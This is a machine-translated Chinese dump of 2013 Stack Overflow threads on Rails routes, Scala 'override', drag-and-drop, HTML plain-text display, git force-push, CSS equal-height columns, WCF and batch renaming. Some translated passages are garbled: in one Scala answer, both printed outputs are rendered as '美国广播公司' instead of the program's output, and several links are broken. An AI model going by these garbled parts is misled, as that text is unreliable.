```

它现在链接到`/clients/1/positions/1/edit`而不是`/users/1/clients/1/positions/1/edit`所以我认为我在正确的轨道上。我知道有人评论寻找答案，所以希望这会有所帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T19:46:42.190

尝试

``edit_user_client_position_path(@user, @client, @position)``

# c++ - 如何获取可编辑 QWebView 上的文本光标位置？

> ID：16110368
> 
> 赞同：1
> 
> 时间：2013-04-19T17:33:04.987
> 
> 标签：c++, qt, qtwebkit

我尝试在包括 QWebView 本身在内的众多对象上使用 cursor() 属性，但这似乎返回了鼠标光标的位置，而不是文本光标。我正在尝试做这样的事情......

```
QWebView* view = new QWebView(this);
view->page()->setContentEditable(true);
Point* p = view->cursor().pos(); // mouse cursor! 
```

# scala - Scala：“覆盖”的目的是什么

> ID：16110370
> 
> 赞同：34
> 
> 时间：2013-04-19T17:33:10.307
> 
> 标签：scala

我不确定`override`关键字的用途是什么，在 scala 中。如果我有

```
trait Shape { def foo(v: Int) }
class Triangle extends Shape { override def foo(v: Int) {} } 
```

它的行为（显然至少）与没有`override`.

* * *

## 回答 #1

> 赞同：69
> 
> 时间：2013-04-19T17:37:41.043

如果您要实现示例中的抽象方法，则不一定要添加`override`修饰符。

但是，如果您想`override`从超类中获取具体方法，则`override`修饰符是必需的。这是为了避免混合组合可能发生的意外覆盖——在某些重构过程中混合特征很容易引入一个方法定义，该方法定义可以被类主体中定义的方法覆盖，因此需要明确说明方法是一个覆盖。

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2013-04-19T19:06:07.577

在您的特定情况下，您从 axel22 获得了全面的答案。我只想补充一点，至少还有一种情况可能会遇到覆盖修饰符。该关键字也可以与特征方法一起使用。

假设你有一个抽象类：

```
abstract class Writer {
  def print(str: String)
} 
```

及其在控制台上打印的具体实现

```
class ConsoleWriter extends Writer {
  def print(str: String) = println(str)
} 
```

现在，您想要创建一个可以修改其行为的特征。看下面的实现：

```
trait Uppercase extends Writer {
  abstract override def print(str: String) = 
    super.print(str.toUpperCase())
} 
```

请注意，方法有两个修饰符：abstract 和 override。这仅允许用于特征，这意味着必须将特征混合到某个类中，该类具有相关方法的具体定义

使用上面的定义，您可以执行以下操作：

```
val writer = new ConsoleWriter with Uppercase
writer.print("abc") 
```

这将产生结果

美国广播公司

同样徒劳，您可以添加更多特征：

```
trait WithSpaces extends Writer {
  abstract override def print(str: String) = 
    super.print(str.split("").mkString(" ").tail)
} 
```

现在当你打电话

```
val writer = new ConsoleWriter with Uppercase with WithSpaces
writer.print("abc") 
```

你会看见：

美国广播公司

上面在特征中使用覆盖修饰符是 scala 中的一个显着特征，您不会在 java 中看到它。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-04-19T17:37:32.217

它用于错误检查。
假设你有

```
trait Shape { def foo(v: Int) = 1 }
class Triangle extends Shape { override def foo(v: Int) = 2 } 
```

然后你将 Shape 更改为

```
trait Shape { def bar(v: Int) = 1 } 
```

在这种情况下，“覆盖”会告诉您`foo`in`Triangle`不会覆盖任何内容。

另见：
[http ://docs.oracle.com/javase/7/docs/api/java/lang/Override.html](http://docs.oracle.com/javase/7/docs/api/java/lang/Override.html)
[http://en.wikipedia.org/wiki/C%2B%2B11#Explicit_overrides_and_final](http://en.wikipedia.org/wiki/C%2B%2B11#Explicit_overrides_and_final)

# javascript - 删除时获取对原始元素的引用

> ID：16110371
> 
> 赞同：0
> 
> 时间：2013-04-19T17:33:17.123
> 
> 标签：javascript, jquery, html, drag-and-drop

我正在使用 HTML5 本机拖放将图像拖放到 div 中。这是一个例子：http: [//jsbin.com/ipojuk/1/](http://jsbin.com/ipojuk/1/)

问题是，一旦丢弃相同的图像，就不应再次丢弃。如何防止这种情况发生？为此，我`data-inplan`在图像中设置了一个属性，并且我打算在`true`删除图像后将其设置为，但我找不到一种简单的方法来获取对函数中原始图像的引用`dragDrop`。我考虑过使用`id`，但这些图像是在运行时创建的，生成 id 对我来说很难。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:20:13.027

这将允许您只删除每种类型的一个图像（检查 src）

```
function dragDrop(e) {

 if (e.stopPropagation) {
      e.stopPropagation(); // Stops some browsers from redirecting
  }

  var $item = $(e.dataTransfer.getData('text/html'));

  var exists = false;
  $(".divRendezvous img").each(function()
  {
    if($(this).attr("src")==$item.attr("src"))
    {
      exists = true;
      return;
    }
  });
  if(!exists)
    $item.appendTo(e.target);  
  return false;
} 
```

**jsBin**：http: [//jsbin.com/ipojuk/12/edit](http://jsbin.com/ipojuk/12/edit)

# javascript - HTML5 和 Javascript：window.location 杀死 localStorage？

> ID：16110375
> 
> 赞同：1
> 
> 时间：2013-04-19T17:33:28.983
> 
> 标签：javascript, json, html, local-storage

我正在尝试使用以下 window.location 重定向到另一个页面，但是正在删除浏览器 localStorage 中的数据。我通过使用 JSON stringify 将数据存储到一个数组中：

```
function replaceCartStorage(arr){
    if(arr.length==0){
        localStorage.removeItem("cart");
        window.location = "http://localhost/cw2/Basket.html";
    }else{
        localStorage["cart"] = JSON.stringify(arr);
        window.location = "http://localhost/cw2/Basket.html";
    }
} 
```

# iphone - Iphone 应用 XML 读取

> ID：16110378
> 
> 赞同：0
> 
> 时间：2013-04-19T17:33:38.550
> 
> 标签：iphone, objective-c, xml, xcode, flurry

我正在用 xcode 制作一个 iphone 应用程序，它必须能够读取从网络上检索到的 xml。它适用于我尝试过的每个 xml，除了这个。它出什么问题了？

```
<appMetrics versionName="1.1.0" startDate="2013-04-16" metric="ActiveUsersByDay" groupBy="dayOfYear" endDate="2013-04-18" country="US" version="1.0" generatedDate="4/19/13 10:10 AM">
<day value="6" date="2013-04-16"/>
<day value="4" date="2013-04-17"/>
<day value="2" date="2013-04-18"/>
</appMetrics> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T21:47:16.040

问题是当我在浏览器中输入 URL 时，它会给我一个 XML，但是在 xcode 中它会给我一个 JSON。我只需要以 XML 格式请求它。

# html - 导致其他标签呈现为纯文本的 HTML 标签

> ID：16110382
> 
> 赞同：11
> 
> 时间：2013-04-19T17:33:51.483
> 
> 标签：html

我想在页面中添加一个区域，其中所有动态内容都呈现为纯文本而不是标记。例如：

```
 <myMagicTag>
      <b>Hello</b> World
  </myMagicTag> 
```

我希望`<b>`标签显示为文本而不是粗体指令。我宁愿不必编写代码来将每个“<”转换为“ `&lt;`”。

我知道这样`<textarea>`做可以，但它还有其他不良副作用，例如添加滚动条。

myMagicTag 存在吗？

*编辑：*执行此操作的 jQuery 或 javascript 函数也可以。不幸的是，不能在服务器端进行。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-19T23:58:41.070

您可以使用[`script`元素](http://www.w3.org/TR/html5/scripting-1.html#the-script-element)（由我加粗）执行此操作：

> 该`script`元素允许作者在他们的文档中包含动态脚本和**数据块。**

例子：

```
<script type="text/plain">
This content has the media type plain/text, so characters reserved in HTML have no special meaning here: <div> ← this will be displayed.
</script> 
```

（请注意，`script`元素的允许内容是[受限](http://www.w3.org/TR/html5/scripting-1.html#restrictions-for-contents-of-script-elements)的，例如，您[不能](http://www.w3.org/TR/html5/syntax.html#cdata-rcdata-restrictions)将其`</script>`作为文本内容（它会关闭`script`元素）。）

通常，`script`元素`display:none`默认存在于浏览器的 CSS 中，因此您需要在 CSS 中覆盖它，例如：

```
script[type="text/plain"] {display:block;} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-19T17:45:10.837

该标签曾经是，`<XMP>`但在 HTML 4 中已被弃用。浏览器似乎并没有放弃它的支持，但除了快速调试之外，我不推荐它。[MDN 文章 about`<XMP>`](https://developer.mozilla.org/en-US/docs/HTML/Element/xmp)列出了另外两个标签`<plaintext>`和`<listing>`，它们甚至更早被弃用。我不知道任何当前的替代方案。

不管怎样，在大多数编程语言中，将纯文本编码为 HTML 的代码都非常简单。

注意：“*相似*”一词的确切含义是——这三个都旨在将纯文本注入 HTML。我并不是暗示它们是同义词或它们的行为相同——它们不是。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-19T18:21:53.470

您可以使用函数来转义 < >，例如：

```
'span.name': function(){
return this.name.replace(/</g, '&lt;').replace(/>/g, '&gt;');
} 
```

也看看`<plaintext></plaintext>`。我自己没有使用过它，但众所周知，它会将后面的所有内容呈现为纯文本（我的意思是说它忽略了结束标签，因此以下所有代码都呈现为文本）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-08-04T14:03:29.377

除了 deprecated 之外没有特定的标签`<xmp>`。
但是允许脚本标签存储未格式化的数据。

这是迄今为止显示**动态**内容的唯一解决方案，如您所愿。
运行代码片段以获取更多信息。

```
<script id="myMagicTag" type="text/plain" style="display:block;">
      <b>Hello</b> World
</script>

Use <a href="https://stackoverflow.com/questions/38143580/when-should-script-tags-be-visible-and-why-can-they">Visible</a> <a href="https://html.spec.whatwg.org/multipage/scripting.html#data-block">Data-blocks</a>

<script>
      document.querySelector("#myMagicTag").innerHTML = "<b>Unformatted</b> dynamic content"
</script>
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-19T17:35:59.643

不，这是不可能的，您需要对其进行 HtmlEncode。

如果您使用服务器端语言，那并不难。

在 .NET 中，你会做这样的事情：

```
string encodedtext = HttpContext.Current.Server.HtmlEncode(plaintext); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-01-09T19:08:51.847

在我的应用程序中，我需要防止 HTML 呈现

```
"if (a<b || c>100) ..." 
```

和

```
"cout << ...". 
```

此外，整个 C++ 代码区域 HTML 必须通过 GCC 编译器才能达到预期效果。我遇到了两个方案：

第一的：

```
//<xmp>
#include <string>
//</xmp>} 
```

由于我无法理解的原因，该`<xmp>`标签已被弃用。我发现 (2016-01-09) Chrome 和 FF 至少以我想要的方式呈现标签。在研究我的问题时，我看到 HTML 5 中需要 <xmp> 的注释。

其次，在 中`<head> ... </head>`，插入：

```
<style type="text/css">
    textarea { border: none; }
</style> 
```

然后在 中`<body> ... </body>`，写：

```
//<br />  <textarea rows="4" disabled cols="80">
#include <stdlib.h>
#include <iostream>
#include <string>
//</textarea>  <br /> 
```

注意：设置`"cols="80"`为防止以下文本出现在右侧。设置`"rows=..."`为比标签中包含的多行。这可以防止滚动条。第二种技术有几个缺点：

*   “disabled”属性对区域进行着色
*   发送到编译器的代码中的难以理解的复杂注释
*   更难理解
*   更多打字

但是，这种方法既没有过时也没有过时。HTML 之神会让他们的脸向您闪耀。

# git - 当我看到错误时如何保持本地：[rejected] master -> master (non-fast-forward)

> ID：16110384
> 
> 赞同：0
> 
> 时间：2013-04-19T17:33:54.690
> 
> 标签：git

使用时`git push`，我看到了错误：

```
[rejected]        master -> master (non-fast-forward) 
```

我已经仔细检查过，我 100% 确定我想保留本地 master 分支的文件和文件夹。而且我还仔细检查了远程 bitbucket 的 master 是否已过时，而不是我想要保留的内容。

那我可以`git push --force`吗？或者还有其他方法吗？恐怕这`git pull`会破坏我所有的本地文件。

我是这个项目中唯一的程序员。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:37:21.857

`git push --force`如果其他人从 repo 中删除了更改，您应该非常小心使用。但听起来你是唯一的用户？在那种情况下，我觉得你的情况是合理的。

如果您想记录远程更改以进行比较和可能的合并，您可以使用`git fetch`它们。这不会以任何方式修改您的本地分支机构。

# html - 如何让两个div的高度相同

> ID：16110387
> 
> 赞同：3
> 
> 时间：2013-04-19T17:34:14.970
> 
> 标签：html, css

我有一个网站，我需要主页和右侧面板 div 元素的高度相同。

这是我到目前为止得到的标记：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
  <style type="text/css">

* 
{
    margin:                 0;
    padding:                0;
}

body, form, html {
    height:             100%;
}
html
{
    font-family:        helvetica, Arial,sans-serif;
    font-size:          13px;
    margin:             0px;
    padding:            0px;
    background-color:   #f4f4f4;
}

.wrapper 
{
    min-height:         100%;
    height:             auto !important;
    height:             100%;
    margin:             0 auto -140px;
}

#header
{
    background:         url("Images/backgrounds/headback_50x50.jpg") repeat-x scroll center top;
    width:              100%;
    margin-top:         0px;
    height:             50px;
    background-color:   #474747;

}
#header .content {
    width:              100%;
    max-width:          1000px;
    margin-left:        auto;
    margin-right:       auto;
}
#header #mainMenu {
    float:              left;
    margin-left:        50px;
    margin-top:         23px;
}
#mainContent
{

    background-repeat:  repeat-y;
    width:              1006px;
    padding:            10px 20px 10px 20px;
    background-color:   #f4f4f4;
    min-height:         100%;
    height:             auto !important;
    height:             100%;
    margin:             0 auto;
}
#mainContent #page {
    width:              800px;
    float:              left;
    background-color:   #ffffff;
    -moz-border-radius:     4px 4px 4px 4px;
    -webkit-border-radius: 4px 4px 4px 4px;
    border-radius:          4px 4px 4px 4px;
}

#mainContent #rightPanel {
    width:              196px;
    overflow:           visible;
    float:              left;
    margin-left:        10px;
    height:             1000px;
}

#mainContent #rightPanel #rightCon {
    background-color:   #ffffff;
    padding:            7px;
    -moz-border-radius:     4px 4px 4px 4px;
    -webkit-border-radius: 4px 4px 4px 4px;
    border-radius:          4px 4px 4px 4px;
}
#footer
{
    background:         url("Images/backgrounds/footerback_300x300.jpg") repeat-x scroll center top;
    width:              100%;
    margin:             0px;
    height:             200px;
    background-color:   #3d3d3d;
}

</style>
</head>
<body>
<div class="wrapper">
            <div id="header">
                <div class="content">
                    <div id="contentBody">
                        <div class="mainLogo">&nbsp;</div>
                        <div id="mainMenu">

                        </div>
                        <div style="clear:both;"></div>
                    </div>
                    <div style="clear:both;"></div>
                </div>
            </div>

            <div id="mainContent">
                <div id="page">
                    Lorem ipsum dolor sit amet, et molestie diam viverra sed proin, nec aenean. Vel donec donec, luctus donec elementum sed. Tristique arcu ut mauris quam potenti in. Mauris velit ut torquent, sagittis et, mi tellus tincidunt elit posuere. Enim aliquam quam sociosqu wisi. Dignissim blandit id. Praesent donec, pellentesque nulla.
Integer aliquam tincidunt sapien neque nec, auctor lacinia nullam lectus dolor. Vehicula litora vel lacinia, auctor ultricies, lacus orci ligula leo eros, turpis vel repellendus erat felis totam suscipit, nulla magnis justo wisi inceptos. A tortor eget quis massa vitae mauris, urna lorem auctor congue, aliquam pellentesque at, quis enim id platea ipsum et. Lectus mauris, hac sit vestibulum diam nam, massa laoreet arcu tincidunt sagittis malesuada mattis, velit in lacus augue quisque, quam eget dolor et. Nostrud nec, urna natoque, turpis a, mauris id viverra id. Sit posuere, ut placerat, ac tempus nulla consectetuer. Sit fames quam morbi proin ut, mi massa, justo erat at curae tellus dignissim non, viverra sodales egestas imperdiet molestie faucibus mauris, morbi massa enim non.
Nec massa. Libero ornare est magnis, placerat ipsum justo ut in penatibus tortor, libero rutrum incididunt vehicula, elit elit accumsan donec. Urna auctor nonummy arcu, mi vivamus enim dis eu, etiam cursus faucibus quam eu, neque ipsum, ultrices enim. Laoreet mollis vestibulum, ut lacus ante ipsum. Hymenaeos sapien ut at, non wisi ipsum magna sed et justo, nulla adipiscing quis eget et feugiat diam, justo malesuada curabitur, aliquet ac condimentum quisque justo duis tortor. Vestibulum in semper turpis scelerisque diam, egestas magna dolorum, est consequat velit consectetuer tempus, orci est. Netus amet, eos rutrum lacus, nec ad sed ipsum tortor mattis tincidunt, et eget ut auctor aliquam sollicitudin diam, ornare elit pede cursus ornare elit ante. Suspendisse suspendisse sem justo, erat dictum elementum volutpat vel urna a. Vestibulum sodales, vel ut massa sapien orci, luctus provident iaculis, lorem libero ut et in, at ante felis. Maecenas praesent in. Justo ut sollicitudin magnis vitae morbi, auctor malesuada vel vestibulum vitae, in risus elit mi, facilisi suscipit congue volutpat nisi et, pretium lacus.
Velit amet vel praesent id, elit duis bibendum pharetra phasellus eget sit, nibh consequat, justo magna vestibulum vestibulum. Vitae elit tortor adipiscing aliquam, sit elit fringilla velit tincidunt in risus, aenean sem lectus phasellus mattis volutpat quis. Sem vehicula lorem id eros nullam, at proin in. Wisi dictum imperdiet, nunc gravida nibh, pellentesque tellus aliquam diam culpa sit amet, porro pede risus volutpat faucibus ut libero, viverra donec. Fringilla mauris duis mauris turpis nam. Ante pellentesque, fusce lacus vitae lacus tincidunt, laoreet eget, vel faucibus amet vel. Eleifend cras et fermentum pharetra, justo porta, sapien amet nullam habitant dolor curabitur et, id eu sit. Vitae at, in et. Convallis rutrum.
Lorem ipsum dolor sit amet, et molestie diam viverra sed proin, nec aenean. Vel donec donec, luctus donec elementum sed. Tristique arcu ut mauris quam potenti in. Mauris velit ut torquent, sagittis et, mi tellus tincidunt elit posuere. Enim aliquam quam sociosqu wisi. Dignissim blandit id. Praesent donec, pellentesque nulla.
Integer aliquam tincidunt sapien neque nec, auctor lacinia nullam lectus dolor. Vehicula litora vel lacinia, auctor ultricies, lacus orci ligula leo eros, turpis vel repellendus erat felis totam suscipit, nulla magnis justo wisi inceptos. A tortor eget quis massa vitae mauris, urna lorem auctor congue, aliquam pellentesque at, quis enim id platea ipsum et. Lectus mauris, hac sit vestibulum diam nam, massa laoreet arcu tincidunt sagittis malesuada mattis, velit in lacus augue quisque, quam eget dolor et. Nostrud nec, urna natoque, turpis a, mauris id viverra id. Sit posuere, ut placerat, ac tempus nulla consectetuer. Sit fames quam morbi proin ut, mi massa, justo erat at curae tellus dignissim non, viverra sodales egestas imperdiet molestie faucibus mauris, morbi massa enim non.
Nec massa. Libero ornare est magnis, placerat ipsum justo ut in penatibus tortor, libero rutrum incididunt vehicula, elit elit accumsan donec. Urna auctor nonummy arcu, mi vivamus enim dis eu, etiam cursus faucibus quam eu, neque ipsum, ultrices enim. Laoreet mollis vestibulum, ut lacus ante ipsum. Hymenaeos sapien ut at, non wisi ipsum magna sed et justo, nulla adipiscing quis eget et feugiat diam, justo malesuada curabitur, aliquet ac condimentum quisque justo duis tortor. Vestibulum in semper turpis scelerisque diam, egestas magna dolorum, est consequat velit consectetuer tempus, orci est. Netus amet, eos rutrum lacus, nec ad sed ipsum tortor mattis tincidunt, et eget ut auctor aliquam sollicitudin diam, ornare elit pede cursus ornare elit ante. Suspendisse suspendisse sem justo, erat dictum elementum volutpat vel urna a. Vestibulum sodales, vel ut massa sapien orci, luctus provident iaculis, lorem libero ut et in, at ante felis. Maecenas praesent in. Justo ut sollicitudin magnis vitae morbi, auctor malesuada vel vestibulum vitae, in risus elit mi, facilisi suscipit congue volutpat nisi et, pretium lacus.
Velit amet vel praesent id, elit duis bibendum pharetra phasellus eget sit, nibh consequat, justo magna vestibulum vestibulum. Vitae elit tortor adipiscing aliquam, sit elit fringilla velit tincidunt in risus, aenean sem lectus phasellus mattis volutpat quis. Sem vehicula lorem id eros nullam, at proin in. Wisi dictum imperdiet, nunc gravida nibh, pellentesque tellus aliquam diam culpa sit amet, porro pede risus volutpat faucibus ut libero, viverra donec. Fringilla mauris duis mauris turpis nam. Ante pellentesque, fusce lacus vitae lacus tincidunt, laoreet eget, vel faucibus amet vel. Eleifend cras et fermentum pharetra, justo porta, sapien amet nullam habitant dolor curabitur et, id eu sit. Vitae at, in et. Convallis rutrum.

                  Lorem ipsum dolor sit amet, et molestie diam viverra sed proin, nec aenean. Vel donec donec, luctus donec elementum sed. Tristique arcu ut mauris quam potenti in. Mauris velit ut torquent, sagittis et, mi tellus tincidunt elit posuere. Enim aliquam quam sociosqu wisi. Dignissim blandit id. Praesent donec, pellentesque nulla.
Integer aliquam tincidunt sapien neque nec, auctor lacinia nullam lectus dolor. Vehicula litora vel lacinia, auctor ultricies, lacus orci ligula leo eros, turpis vel repellendus erat felis totam suscipit, nulla magnis justo wisi inceptos. A tortor eget quis massa vitae mauris, urna lorem auctor congue, aliquam pellentesque at, quis enim id platea ipsum et. Lectus mauris, hac sit vestibulum diam nam, massa laoreet arcu tincidunt sagittis malesuada mattis, velit in lacus augue quisque, quam eget dolor et. Nostrud nec, urna natoque, turpis a, mauris id viverra id. Sit posuere, ut placerat, ac tempus nulla consectetuer. Sit fames quam morbi proin ut, mi massa, justo erat at curae tellus dignissim non, viverra sodales egestas imperdiet molestie faucibus mauris, morbi massa enim non.
Nec massa. Libero ornare est magnis, placerat ipsum justo ut in penatibus tortor, libero rutrum incididunt vehicula, elit elit accumsan donec. Urna auctor nonummy arcu, mi vivamus enim dis eu, etiam cursus faucibus quam eu, neque ipsum, ultrices enim. Laoreet mollis vestibulum, ut lacus ante ipsum. Hymenaeos sapien ut at, non wisi ipsum magna sed et justo, nulla adipiscing quis eget et feugiat diam, justo malesuada curabitur, aliquet ac condimentum quisque justo duis tortor. Vestibulum in semper turpis scelerisque diam, egestas magna dolorum, est consequat velit consectetuer tempus, orci est. Netus amet, eos rutrum lacus, nec ad sed ipsum tortor mattis tincidunt, et eget ut auctor aliquam sollicitudin diam, ornare elit pede cursus ornare elit ante. Suspendisse suspendisse sem justo, erat dictum elementum volutpat vel urna a. Vestibulum sodales, vel ut massa sapien orci, luctus provident iaculis, lorem libero ut et in, at ante felis. Maecenas praesent in. Justo ut sollicitudin magnis vitae morbi, auctor malesuada vel vestibulum vitae, in risus elit mi, facilisi suscipit congue volutpat nisi et, pretium lacus.
Velit amet vel praesent id, elit duis bibendum pharetra phasellus eget sit, nibh consequat, justo magna vestibulum vestibulum. Vitae elit tortor adipiscing aliquam, sit elit fringilla velit tincidunt in risus, aenean sem lectus phasellus mattis volutpat quis. Sem vehicula lorem id eros nullam, at proin in. Wisi dictum imperdiet, nunc gravida nibh, pellentesque tellus aliquam diam culpa sit amet, porro pede risus volutpat faucibus ut libero, viverra donec. Fringilla mauris duis mauris turpis nam. Ante pellentesque, fusce lacus vitae lacus tincidunt, laoreet eget, vel faucibus amet vel. Eleifend cras et fermentum pharetra, justo porta, sapien amet nullam habitant dolor curabitur et, id eu sit. Vitae at, in et. Convallis rutrum.
Lorem ipsum dolor sit amet, et molestie diam viverra sed proin, nec aenean. Vel donec donec, luctus donec elementum sed. Tristique arcu ut mauris quam potenti in. Mauris velit ut torquent, sagittis et, mi tellus tincidunt elit posuere. Enim aliquam quam sociosqu wisi. Dignissim blandit id. Praesent donec, pellentesque nulla.
Integer aliquam tincidunt sapien neque nec, auctor lacinia nullam lectus dolor. Vehicula litora vel lacinia, auctor ultricies, lacus orci ligula leo eros, turpis vel repellendus erat felis totam suscipit, nulla magnis justo wisi inceptos. A tortor eget quis massa vitae mauris, urna lorem auctor congue, aliquam pellentesque at, quis enim id platea ipsum et. Lectus mauris, hac sit vestibulum diam nam, massa laoreet arcu tincidunt sagittis malesuada mattis, velit in lacus augue quisque, quam eget dolor et. Nostrud nec, urna natoque, turpis a, mauris id viverra id. Sit posuere, ut placerat, ac tempus nulla consectetuer. Sit fames quam morbi proin ut, mi massa, justo erat at curae tellus dignissim non, viverra sodales egestas imperdiet molestie faucibus mauris, morbi massa enim non.
Nec massa. Libero ornare est magnis, placerat ipsum justo ut in penatibus tortor, libero rutrum incididunt vehicula, elit elit accumsan donec. Urna auctor nonummy arcu, mi vivamus enim dis eu, etiam cursus faucibus quam eu, neque ipsum, ultrices enim. Laoreet mollis vestibulum, ut lacus ante ipsum. Hymenaeos sapien ut at, non wisi ipsum magna sed et justo, nulla adipiscing quis eget et feugiat diam, justo malesuada curabitur, aliquet ac condimentum quisque justo duis tortor. Vestibulum in semper turpis scelerisque diam, egestas magna dolorum, est consequat velit consectetuer tempus, orci est. Netus amet, eos rutrum lacus, nec ad sed ipsum tortor mattis tincidunt, et eget ut auctor aliquam sollicitudin diam, ornare elit pede cursus ornare elit ante. Suspendisse suspendisse sem justo, erat dictum elementum volutpat vel urna a. Vestibulum sodales, vel ut massa sapien orci, luctus provident iaculis, lorem libero ut et in, at ante felis. Maecenas praesent in. Justo ut sollicitudin magnis vitae morbi, auctor malesuada vel vestibulum vitae, in risus elit mi, facilisi suscipit congue volutpat nisi et, pretium lacus.
Velit amet vel praesent id, elit duis bibendum pharetra phasellus eget sit, nibh consequat, justo magna vestibulum vestibulum. Vitae elit tortor adipiscing aliquam, sit elit fringilla velit tincidunt in risus, aenean sem lectus phasellus mattis volutpat quis. Sem vehicula lorem id eros nullam, at proin in. Wisi dictum imperdiet, nunc gravida nibh, pellentesque tellus aliquam diam culpa sit amet, porro pede risus volutpat faucibus ut libero, viverra donec. Fringilla mauris duis mauris turpis nam. Ante pellentesque, fusce lacus vitae lacus tincidunt, laoreet eget, vel faucibus amet vel. Eleifend cras et fermentum pharetra, justo porta, sapien amet nullam habitant dolor curabitur et, id eu sit. Vitae at, in et. Convallis rutrum.
                </div>
                <div id="rightPanel">
                    <div id="rightCon">
                        Right Panel
                    </div>
                    &nbsp;
                </div>
                <div style="clear:both;"></div>
            </div>
            <div class="push"></div>
        </div>
        <div id="footer">
            <div class="content">
                Footer
            </div>
        </div>
    </body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:39:21.020

使用负边距设置高度相等的 div；

**CSS**

```
#container {
width:960px;
margin: 0 auto;
}

#content {
float:left;
width:700px;
border-left: 260px solid #555;
}

#sidebar {
float: left;
width:260px;
margin-right: -260px;
position: relative;
} 
```

**HTML**

```
<div id="container">

<div id="sidebar">
    <p>Sidebar</p>
</div>

<div id="content">
    <p>Main content</p>
</div>

</div> 
```

这是实现等高柱效的一种非常有效的方法。您还可以查看其他一些方法来实现这一点，这可能更适合您的需求。

[http://www.vanseodesign.com/css/equal-height-columns/](http://www.vanseodesign.com/css/equal-height-columns/)

我确信将它实现到您给出的代码中应该不是那么难的任务，所以我将把它留给您。

祝你的网站好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:46:31.710

`display: table-cell`是此类问题的简单可靠的解决方案。一个例子：http: [//jsfiddle.net/26MGE/](http://jsfiddle.net/26MGE/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T17:46:47.267

如果您能够使用 jQuery，那么当您只需要：

```
$("#rightCon").height($('#page').height()); 
```

**[小提琴](http://jsfiddle.net/UAguW/)**

# c# - 如何覆盖 WcF 对象的 ToString 方法？

> ID：16110389
> 
> 赞同：2
> 
> 时间：2013-04-19T17:34:20.533
> 
> 标签：c#, .net, wcf, web-services, web

基本上我想在服务器端覆盖 WCF 对象的 .ToString 方法。这怎么可能实现？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-19T17:38:09.397

从服务器端 WSDL 生成的类被创建为部分的。你可以这样做：

```
public partial YourObject{

public override string ToString()
{
  //implementation
}
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-28T08:57:28.687

你的意思是服务器端的数据合约（你有你的服务）？如果是这样，是什么阻止您像对任何其他类一样覆盖 ToString() ？但是，正如其他人指出的那样，它不会被序列化（意味着当您添加对该服务的引用时它不会显示在客户端）。

您可以按照 Filip 上面的建议在客户端获得类似的行为。或者，当您在客户端上配置服务引用时，您可以重复使用相同的 dll（您在其中定义数据合同）。

# windows - 复制 *.ext *.ex_ 不适用于绝对路径

> ID：16110392
> 
> 赞同：1
> 
> 时间：2013-04-19T17:34:34.370
> 
> 标签：windows, batch-file, command-line-interface

`*.ext`我可以通过执行以下操作将当前目录中的所有文件重命名为`*.ex_`：

```
rename *.ext *.ex_ 
```

然而，这似乎不适用于绝对路径。例如。

```
rename C:\path\to\*.ext C:\path\to\*.ex_ 
```

当我尝试时，出现以下错误：

```
The syntax of the command is incorrect. 
```

有任何想法吗？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:37:58.420

检查[`rename`](http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/rename.mspx?mfr=true)文档：

```
rename [Drive:][Path] filename1 filename2 
```

所以，要正确，你应该像这样使用重命名：

```
rename C:\path\to\*.ext *.ex_ 
```

仅适用于第一个参数的完整路径

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:42:01.443

> 重命名 C:\path\to\*.ext *.ex_

或者

> ren C:\path\to\*.ext *.ex_

如果您想将它们重命名为新目的地，您可以使用 xcopy

> xcopy C:\path\to\*.ext C:\path\to-new\*.ex_

# c# - 寻找序列化方法或常量的解决方法

> ID：16110393
> 
> 赞同：3
> 
> 时间：2013-04-19T17:34:48.223
> 
> 标签：c#, wcf, serialization

显然我的教育失败了，因为我没有意识到 C# 中的方法不能被序列化。（很高兴知道。）

我正在尝试创建一个返回我创建的简单类的 WCF 服务。问题是这个简单的类包含我想要公开的方法，而我的服务的调用者将无法访问它们（假设它们没有包含类声明的 .dll）。

```
public class Simple
{
    public string Message { get; set; }
    private const string _Hidden = "Underpants";

    public string Hidden
    {
        get { return _Hidden; }
    }

    public string GetHidden()
    {
        return _Hidden;
    }
} 
```

我设置了一个 WCF 服务（我们称之为 MyService）来返回我的 Simple 类的一个实例。令我沮丧的是，我只恢复了部分课程。

```
public void CallService()
{
    using (var client = new MyService.Serviceclient())
    {
        Simple result = client.GetSimple();
        string message = result.Message; // this works.
        string hidden = result.Hidden;  // this doesn't.
        string fail = result.GetHidden(); // Underpants remains elusive.
    }
} 
```

是否有任何类型的解决方法，我可以在我的类上设置一个属性或方法，任何调用我的服务的人都可以访问这些属性或方法？如何处理仅存在于服务中的类中设置的常量或其他方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:49:38.477

通常，您会创建**三个**不同的项目。

```
 1\. Service project
 2\. Client project 
 3\. Data project 
```

Data 项目仅包含数据类 - 没有应用程序代码。这些数据类中的方法和常量应该独立于服务/客户端项目。Data 项目作为参考包含在 Service 和 Client 项目中，因此序列化和反序列化针对同一个二进制文件进行 - 您可以保留常量/方法/等。

